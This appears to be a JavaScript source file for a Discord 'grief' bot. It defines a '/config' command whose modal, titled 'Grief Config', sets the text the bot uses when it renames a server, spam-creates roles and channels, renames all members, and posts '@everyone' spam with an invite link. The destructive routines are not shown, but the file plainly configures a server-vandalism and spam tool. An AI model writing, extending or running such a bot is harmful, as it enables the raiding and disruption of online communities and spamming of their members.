const { SlashCommandBuilder, MessageFlags, InteractionContextType, ModalBuilder, LabelBuilder, TextInputStyle, TextInputBuilder } = require('discord.js');

module.exports = {
	data: new SlashCommandBuilder()
		.setName('config')
		.setDescription('bot config stuff, is only saved temporarily')
		.setContexts(InteractionContextType.BotDM, InteractionContextType.Guild, InteractionContextType.PrivateChannel),
	async execute(interaction) {
		try {
			const keyv = interaction.client.keyv.get(interaction.user.id);

			let serverName = await keyv.get('serverName') || 'https://www.youtube.com/@FreeCliff';
			let roleNames = await keyv.get('roleNames') || 'https://www.youtube.com/@FreeCliff';
			let channelNames = await keyv.get('channelNames') || 'free-cliff-mogs-you';
			let memberNames = await keyv.get('memberNames') || 'youtube.com/@FreeCliff';
			let thugText = await keyv.get('thugText') || '@everyone discord.gg/qgqn3xeuMn';

			const modal = new ModalBuilder().setCustomId(`configmodal_${interaction.id}`).setTitle('Grief Config').addLabelComponents(
				new LabelBuilder()
					.setLabel('Server Name')
					.setDescription('Bot will change server names to this.')
					.setTextInputComponent(
						new TextInputBuilder()
							.setCustomId('serverName')
							.setStyle(TextInputStyle.Short)
							.setMinLength(1)
							.setMaxLength(100)
							.setValue(serverName)
							.setRequired(true)),
				new LabelBuilder()
					.setLabel('Role Names')
					.setDescription('Bot will spam create roles with this name.')
					.setTextInputComponent(
						new TextInputBuilder()
							.setCustomId('roleNames')
							.setStyle(TextInputStyle.Short)
							.setMinLength(1)
							.setMaxLength(100)
							.setValue(roleNames)
							.setRequired(true)),
				new LabelBuilder()
					.setLabel('Channel Names')
					.setDescription('Bot will spam create channels with this name.')
					.setTextInputComponent(
						new TextInputBuilder()
							.setCustomId('channelNames')
							.setStyle(TextInputStyle.Short)
							.setMinLength(1)
							.setMaxLength(100)
							.setValue(channelNames)
							.setRequired(true)),
				new LabelBuilder()
					.setLabel('Member Names')
					.setDescription('Bot will try to rename all members to this.')
					.setTextInputComponent(
						new TextInputBuilder()
							.setCustomId('memberNames')
							.setStyle(TextInputStyle.Short)
							.setMinLength(1)
							.setMaxLength(100)
							.setValue(memberNames)
							.setRequired(true)),
				new LabelBuilder()
					.setLabel('Thug Text')
					.setDescription('Bot will add this text in thug messages.')
					.setTextInputComponent(
						new TextInputBuilder()
							.setCustomId('thugText')
							.setStyle(TextInputStyle.Paragraph)
							.setMinLength(1)
							.setMaxLength(500)
							.setValue(thugText)
							.setRequired(true)),
			);

			try {
				await interaction.showModal(modal);

				const submitted = await interaction.awaitModalSubmit({
					time: 120000,
					filter: i => i.user.id === interaction.user.id && i.customId === `configmodal_${interaction.id}`,
				});

				serverName = submitted.fields.getTextInputValue('serverName');
				roleNames = submitted.fields.getTextInputValue('roleNames');
				channelNames = submitted.fields.getTextInputValue('channelNames');
				memberNames = submitted.fields.getTextInputValue('memberNames');
				thugText = submitted.fields.getTextInputValue('thugText');

				try {
					await keyv.set('serverName', serverName);
					await keyv.set('roleNames', roleNames);
					await keyv.set('channelNames', channelNames);
					await keyv.set('memberNames', memberNames);
					await keyv.set('thugText', thugText);

					await submitted.reply({
						content: 'Saved config.',
						flags: MessageFlags.Ephemeral,
					}).catch(console.error);
				}
				catch (error) {
					console.error(error);
					await submitted.reply({
						content: 'Something went wrong while attempting to save config.',
						flags: MessageFlags.Ephemeral,
					}).catch(console.error);
				}
			}
			catch (error) {
				console.error(error);
				if (!interaction.replied && !interaction.deferred) {
					await interaction.followUp({
						content: 'You didn\'t respond in time.',
						flags: MessageFlags.Ephemeral,
					}).catch(console.error);
				}
			}
		}
		catch (error) {
			console.error(error);
			interaction.reply({ content: 'Something went wrong', flags: MessageFlags.Ephemeral }).catch(console.error);
		}
	},
};